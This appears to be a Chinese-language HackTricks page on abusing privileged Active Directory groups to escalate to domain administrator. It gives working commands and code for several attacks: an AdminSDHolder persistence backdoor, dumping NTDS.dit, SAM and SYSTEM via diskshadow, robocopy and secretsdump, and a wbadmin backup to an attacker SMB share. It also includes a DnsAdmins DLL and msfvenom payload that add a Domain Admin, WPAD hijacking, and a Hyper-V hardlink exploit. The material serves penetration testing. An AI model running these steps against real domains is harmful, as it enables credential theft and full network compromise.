# 特权组

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

## 具有管理权限的已知组

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

在安全评估期间，还可以利用其他帐户成员资格和访问令牌权限，通过链接多个攻击向量。

## 帐户操作员 <a href="#account-operators" id="account-operators"></a>

* 允许在域上创建非管理员帐户和组
* 允许在本地登录到 DC

获取该组的**成员**：
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
请注意“spotless”用户的成员身份：

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

然而，我们仍然可以添加新用户：

![](../../.gitbook/assets/a2.png)

同时，可以在本地登录到DC01：

![](../../.gitbook/assets/a3.png)

## AdminSDHolder组

**AdminSDHolder**对象的访问控制列表（ACL）被用作将**权限**复制到Active Directory中的所有“受保护组”及其成员的模板。受保护组包括特权组，如域管理员、管理员、企业管理员和模式管理员。\
默认情况下，此组的ACL会被复制到所有“受保护组”中。这样做是为了防止对这些关键组的故意或意外更改。然而，如果攻击者修改了AdminSDHolder组的ACL，例如给予普通用户完全权限，那么该用户将在受保护组内的所有组上拥有完全权限（在一个小时内）。\
如果有人在一个小时内尝试从域管理员中删除此用户（例如），该用户将重新加入该组。

获取组的**成员**：
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
将用户添加到 **AdminSDHolder** 组中：
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
检查用户是否在**Domain Admins**组中：
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
如果你不想等一个小时，你可以使用一个PowerShell脚本来立即进行恢复：[https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**更多信息请参考ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **AD回收站**

这个组允许你读取已删除的AD对象。其中可能包含一些有趣的信息：
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### 域控制器访问

请注意，我们无法通过当前成员身份访问域控制器上的文件：

![](../../.gitbook/assets/a4.png)

然而，如果用户属于`Server Operators`组：

![](../../.gitbook/assets/a5.png)

情况就会改变：

![](../../.gitbook/assets/a6.png)

### 提权 <a href="#backup-operators" id="backup-operators"></a>

使用[`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)或Sysinternals中的`sc`命令来检查服务的权限。
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
这证实了Server Operators组具有[SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)访问权限，这使我们对该服务拥有完全控制权。\
您可以滥用此服务来[**执行任意命令**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path)并提升权限。

## 备份操作员 <a href="#backup-operators" id="backup-operators"></a>

与`Server Operators`成员身份一样，如果我们属于`Backup Operators`，我们可以**访问`DC01`文件系统**。

这是因为该组授予其**成员**[**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4)和[**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)特权。**SeBackupPrivilege**允许我们**遍历任何文件夹并列出**文件夹内容。这将使我们能够**从文件夹中复制文件**，即使没有其他权限也可以。但是，要滥用此权限复制文件，必须使用标志[**FILE_FLAG_BACKUP_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)。因此，需要使用特殊工具。

为此，您可以使用[**这些脚本**](https://github.com/giuliano108/SeBackupPrivilege)**。**

获取该组的**成员**：
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **本地攻击**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### AD攻击

例如，您可以直接访问域控制器文件系统：

![](../../.gitbook/assets/a7.png)

您可以滥用此访问权限来**窃取**活动目录数据库**`NTDS.dit`**，以获取域中所有用户和计算机对象的**NTLM哈希值**。

#### 使用diskshadow.exe转储NTDS.dit

使用[**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)，您可以在`C`驱动器和`F`驱动器（例如）上**创建一个阴影副本**。然后，您可以从此阴影副本中窃取`NTDS.dit`文件，因为系统不会使用它：
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
与本地攻击类似，您现在可以复制特权文件 **`NTDS.dit`**：
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
另一种复制文件的方法是使用[**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**：**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
然后，您可以轻松地**窃取** **SYSTEM** 和 **SAM** 文件：
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
最后，您可以从`NTDS.dit`中获取所有哈希值：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### 使用wbadmin.exe转储NTDS.dit

使用wbadmin.exe与diskshadow.exe非常相似，wbadmin.exe实用程序是Windows内置的命令行实用程序，自Windows Vista/Server 2008以来就存在。

在使用之前，您需要在攻击者机器上[**设置SMB服务器的NTFS文件系统**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801)。

完成设置SMB服务器后，您需要在目标机器上缓存SMB凭据：
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
如果没有错误，使用wbadmin.exe来利用它：
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
如果成功，它将转储到 `C:\ntds.dit`。

[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

一个属于 **DNSAdmins** 组或具有对 **DNS 服务器** 对象的 **写权限** 的用户可以使用 **SYSTEM** 权限在 **DNS 服务器** 上加载一个 **任意 DLL**。\
这非常有趣，因为 **域控制器** 经常被用作 **DNS 服务器**。

如此 \*\*\*\* [**文章**](https://adsecurity.org/?p=4064) 所示，在运行在域控制器上的 DNS 上可以执行以下攻击（这是非常常见的）：

* DNS 管理是通过 RPC 进行的
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) 允许我们以 **零验证** DLL 路径的方式 **加载** 自定义 **DLL**。可以使用命令行中的 `dnscmd` 工具来完成此操作
* 当 **`DnsAdmins`** 组的成员运行下面的 **`dnscmd`** 命令时，将填充 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` 注册表键
* 当 **DNS 服务重新启动** 时，将会加载此路径中的 **DLL**（即域控制器的机器帐户可以访问的网络共享）
* 攻击者可以加载一个 **自定义 DLL 来获取反向 shell**，甚至加载像 Mimikatz 这样的工具作为 DLL 来转储凭据。

获取该组的 **成员**：
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 执行任意DLL

然后，如果你有一个位于**DNSAdmins组**中的用户，你可以让**DNS服务器以SYSTEM权限加载任意DLL**（DNS服务以`NT AUTHORITY\SYSTEM`身份运行）。你可以通过执行以下命令让DNS服务器加载一个**本地或远程**（通过SMB共享）的DLL文件：
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
可以在[https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL)找到一个有效的DLL示例。我会将函数`DnsPluginInitialize`的代码更改为以下内容：
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
或者你可以使用msfvenom生成一个dll文件：
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
所以，当**DNS服务**启动或重新启动时，将创建一个新用户。

即使在DNSAdmin组中有一个用户，**默认情况下无法停止和重新启动DNS服务**。但是您可以尝试执行以下操作：
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**在ired.team了解更多关于此特权升级的信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

正如在这篇[**文章**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)中详细介绍的那样，也可以使用[Mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)工具的创建者的[mimilib.dll](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)文件来执行命令，通过修改[kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)文件来执行一个反向shell一行命令或其他我们选择的命令。

### 用于中间人攻击的WPAD记录

滥用DnsAdmins组权限的另一种方法是创建一个WPAD记录。在该组中的成员拥有[禁用全局查询阻止安全性](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)的权限，该权限默认情况下会阻止此攻击。Server 2008首次引入了在DNS服务器上添加到全局查询阻止列表的功能。默认情况下，Web代理自动发现协议（WPAD）和站内自动隧道寻址协议（ISATAP）位于全局查询阻止列表中。这些协议非常容易被劫持，任何域用户都可以创建包含这些名称的计算机对象或DNS记录。

在**禁用全局查询阻止**列表并创建**WPAD记录**之后，运行默认设置的每台机器都将通过我们的攻击机器进行流量代理。我们可以使用诸如[Responder](https://github.com/lgandx/Responder)或[Inveigh](https://github.com/Kevin-Robertson/Inveigh)之类的工具来执行流量欺骗，并尝试捕获密码哈希并离线破解它们，或执行SMBRelay攻击。

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## 事件日志读取器

[事件日志读取器](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers)组的成员具有访问生成的事件日志（例如新进程创建日志）的权限。在日志中可能包含敏感信息。让我们看看如何查看这些日志：
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Exchange Windows权限

成员被授予**向域对象写入DACL**的能力。攻击者可以滥用此权限来授予用户[**DCSync**](dcsync.md)权限。\
如果在AD环境中安装了Microsoft Exchange，则通常会发现用户帐户甚至计算机是该组的成员。

这个[**GitHub仓库**](https://github.com/gdedrouas/Exchange-AD-Privesc)解释了一些滥用该组权限来提升权限的**技术**。
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V管理员

[**Hyper-V管理员**](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators)组具有对所有[Hyper-V功能](https://docs.microsoft.com/zh-cn/windows-server/manage/windows-admin-center/use/manage-virtual-machines)的完全访问权限。如果**域控制器**已被**虚拟化**，则应将**虚拟化管理员**视为**域管理员**。他们可以轻松地**创建一个实时域控制器的克隆**，并**挂载**虚拟**磁盘**以离线获取**`NTDS.dit`**文件，并提取域中所有用户的NTLM密码哈希。

还有一篇[博客](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)对此进行了详细说明，即在**删除**虚拟机时，`vmms.exe`会尝试以`NT AUTHORITY\SYSTEM`的身份**恢复相应的`.vhdx`文件**的原始文件权限，而不会模拟用户。我们可以**删除`.vhdx`**文件，并创建一个本地**硬链接**将该文件指向一个**受保护的SYSTEM文件**，然后您将获得完全权限。

如果操作系统容易受到[CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952)或[CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841)的攻击，我们可以利用此漏洞获得SYSTEM权限。否则，我们可以尝试**利用服务器上安装的以SYSTEM上下文运行的服务的应用程序**，该服务可以由非特权用户启动。

### **利用示例**

一个例子是**Firefox**，它安装了**`Mozilla Maintenance Service`**。我们可以更新[此漏洞利用](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)（一个用于NT硬链接的概念验证）以授予当前用户对下面文件的完全权限：
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **获取文件的所有权**

运行PowerShell脚本后，我们应该对该文件拥有**完全控制权并可以获取其所有权**。
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **启动Mozilla维护服务**

接下来，我们可以用一个恶意的`maintenanceservice.exe`文件替换这个文件，**启动**维护**服务**，并以SYSTEM身份执行命令。
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
这个漏洞已经在2020年3月的Windows安全更新中得到了修复，该更新改变了与硬链接相关的行为。
{% endhint %}

## 组织管理

在安装了**Microsoft Exchange**的环境中，该组也存在。\
该组的成员可以**访问**所有域用户的**邮箱**。\
该组还对名为`Microsoft Exchange Security Groups`的OU拥有**完全控制权限**，其中包含了组[**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions)（点击链接查看如何滥用该组进行权限提升）。

## 打印操作员

该组的成员被授予以下权限：

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **在域控制器上本地登录**并关闭它
* 对连接到域控制器的打印机进行**管理**、创建、共享和删除的权限

{% hint style="warning" %}
如果在非提升的上下文中使用命令`whoami /priv`未显示**`SeLoadDriverPrivilege`**，则需要绕过UAC。
{% endhint %}

获取该组的**成员**：
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
请查看此页面了解如何滥用SeLoadDriverPrivilege进行权限提升：

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## 远程桌面用户

该组的成员可以通过RDP访问计算机。\
获取该组的**成员**：
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
更多关于**RDP**的信息：

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## 远程管理用户

该组的成员可以通过**WinRM**访问计算机。
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
关于**WinRM**的更多信息：

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## 服务器操作员 <a href="#server-operators" id="server-operators"></a>

该成员身份允许用户使用以下特权配置域控制器：

* 允许本地登录
* 备份文件和目录
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) 和 [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* 更改系统时间
* 更改时区
* 强制从远程系统关闭
* 恢复文件和目录
* 关闭系统
* 控制本地服务

获取该组的**成员**：
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 参考资料 <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
